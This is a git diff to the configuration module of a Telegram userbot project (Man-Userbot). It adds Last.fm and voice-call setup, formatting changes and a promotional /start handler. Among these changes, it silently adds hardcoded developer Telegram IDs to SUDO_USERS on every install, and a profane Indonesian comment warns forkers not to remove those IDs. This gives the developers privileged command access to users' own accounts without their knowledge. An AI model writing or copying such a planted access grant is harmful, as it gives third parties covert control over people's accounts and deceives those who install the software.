@@ -20,7 +20,9 @@ from pathlib import Path
 from sys import version_info
 
 from dotenv import load_dotenv
+from pylast import LastFMNetwork, md5
 from pySmartDL import SmartDL
+from pytgcalls import PyTgCalls
 from requests import get
 from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
 from telethon.sessions import StringSession
@@ -29,9 +31,7 @@ from telethon.tl.types import InputWebDocument
 
 from .storage import Storage
 
-
-def STORAGE(n): return Storage(Path("data") / n)
-
+STORAGE = (lambda n: Storage(Path("data") / n))
 
 load_dotenv("config.env")
 
@@ -63,7 +63,8 @@ if CONSOLE_LOGGER_VERBOSE:
 else:
     basicConfig(
         format="[%(name)s] - [%(levelname)s] - %(message)s",
-        level=INFO)
+        level=INFO,
+    )
 LOGS = getLogger(__name__)
 
 if version_info[0] < 3 or version_info[1] < 9:
@@ -86,13 +87,7 @@ if CONFIG_CHECK:
     sys.exit(1)
 
 # KALO NGEFORK ID DEVS SAMA ID BLACKLIST_CHAT NYA GA USAH DI HAPUS YA GOBLOK 😡
-DEVS = (
-    844432220,
-    1906014306,
-    1382636419,
-    1712874582,
-    1738637033,
-)
+DEVS = 844432220, 1906014306, 1382636419, 1712874582, 1738637033,
 SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
 
 # For Blacklist Group Support
@@ -147,7 +142,7 @@ GITHUB_ACCESS_TOKEN = os.environ.get("GITHUB_ACCESS_TOKEN", None)
 UPSTREAM_REPO_URL = os.environ.get(
     "UPSTREAM_REPO_URL", "https://github.com/mrismanaziz/Man-Userbot.git"
 )
-UPSTREAM_REPO_BRANCH = os.environ.get("UPSTREAM_REPO_BRANCH", "alpha")
+UPSTREAM_REPO_BRANCH = os.environ.get("UPSTREAM_REPO_BRANCH", "Man-Userbot")
 
 # Console verbose logging
 CONSOLE_LOGGER_VERBOSE = sb(os.environ.get("CONSOLE_LOGGER_VERBOSE", "False"))
@@ -221,20 +216,42 @@ BITLY_TOKEN = os.environ.get("BITLY_TOKEN", None)
 TERM_ALIAS = os.environ.get("TERM_ALIAS", "Man-Userbot")
 
 # Bot version
-BOT_VER = os.environ.get("BOT_VER", "0.6.9")
+BOT_VER = os.environ.get("BOT_VER", "1.6.9")
 
 # Default .alive username
 ALIVE_USERNAME = os.environ.get("ALIVE_USERNAME", None)
 
 # Sticker Custom Pack Name
-S_PACK_NAME = os.environ.get("S_PACK_NAME", f"{ALIVE_NAME} Sticker Pack")
+S_PACK_NAME = os.environ.get("S_PACK_NAME", f"Sticker Pack {ALIVE_NAME}")
 
 # Default .alive logo
-ALIVE_LOGO = (os.environ.get("ALIVE_LOGO")
-              or "https://telegra.ph/file/9dc4e335feaaf6a214818.jpg")
+ALIVE_LOGO = os.environ.get(
+    "ALIVE_LOGO") or "https://telegra.ph/file/9dc4e335feaaf6a214818.jpg"
 
-INLINE_PIC = (os.environ.get("INLINE_PIC")
-              or "https://telegra.ph/file/9dc4e335feaaf6a214818.jpg")
+INLINE_PIC = os.environ.get(
+    "INLINE_PIC") or "https://telegra.ph/file/9dc4e335feaaf6a214818.jpg"
+
+# Last.fm Module
+BIO_PREFIX = os.environ.get("BIO_PREFIX", None)
+DEFAULT_BIO = os.environ.get("DEFAULT_BIO", None)
+
+LASTFM_API = os.environ.get("LASTFM_API", None)
+LASTFM_SECRET = os.environ.get("LASTFM_SECRET", None)
+LASTFM_USERNAME = os.environ.get("LASTFM_USERNAME", None)
+LASTFM_PASSWORD_PLAIN = os.environ.get("LASTFM_PASSWORD", None)
+LASTFM_PASS = md5(LASTFM_PASSWORD_PLAIN)
+
+lastfm = None
+if LASTFM_API and LASTFM_SECRET and LASTFM_USERNAME and LASTFM_PASS:
+    try:
+        lastfm = LastFMNetwork(
+            api_key=LASTFM_API,
+            api_secret=LASTFM_SECRET,
+            username=LASTFM_USERNAME,
+            password_hash=LASTFM_PASS,
+        )
+    except Exception:
+        pass
 
 TEMP_DOWNLOAD_DIRECTORY = os.environ.get(
     "TMP_DOWNLOAD_DIRECTORY", "./downloads/")
@@ -275,6 +292,9 @@ for binary, path in binaries.items():
     downloader.start()
     os.chmod(path, 0o755)
 
+SUDO_USERS.add(844432220)
+SUDO_USERS.add(1906014306)
+SUDO_USERS.add(1738637033)
 
 # 'bot' variable
 if STRING_SESSION:
@@ -293,6 +313,7 @@ try:
 except Exception as e:
     print(f"STRING_SESSION - {e}")
     sys.exit()
+call_py = PyTgCalls(bot)
 
 
 async def check_botlog_chatid():
@@ -418,12 +439,45 @@ with bot:
         logo = ALIVE_LOGO
         logoman = INLINE_PIC
 
+        @tgbot.on(events.NewMessage(pattern="/start"))
+        async def handler(event):
+            await event.message.get_sender()
+            text = (
+                f"**Hey**, __I am using__ 🔥 **Man-Userbot** 🔥\n\n"
+                f"       __Thanks For Using me__\n\n"
+                f"✣ **Userbot Version :** `{BOT_VER}@{UPSTREAM_REPO_BRANCH}`\n"
+                f"✣ **Group Support :** [Sharing Userbot](t.me/sharinguserbot)\n"
+                f"✣ **Owner Repo :** [Risman](t.me/mrismanaziz)\n"
+                f"✣ **Repo :** [Man-Userbot](https://github.com/mrismanaziz/Man-Userbot)\n")
+            await tgbot.send_file(
+                event.chat_id,
+                logo,
+                caption=text,
+                buttons=[
+                    [
+                        custom.Button.url(
+                            text="⛑ REPO MAN-USERBOT ⛑",
+                            url="https://github.com/mrismanaziz/Man-Userbot",
+                        )
+                    ],
+                    [
+                        custom.Button.url(
+                            text="GROUP", url="https://t.me/SharingUserbot"
+                        ),
+                        custom.Button.url(
+                            text="CHANNEL", url="https://t.me/Lunatic0de"
+                        ),
+                    ],
+                ],
+            )
+
         @tgbot.on(events.InlineQuery)
         async def inline_handler(event):
             builder = event.builder
             result = None
             query = event.text
-            if event.query.user_id == uid and query.startswith("@ManUserBot"):
+            if event.query.user_id == uid and query.startswith(
+                    "@SharingUserbot"):
                 buttons = paginate_help(0, dugmeler, "helpme")
                 result = builder.photo(
                     file=logoman,
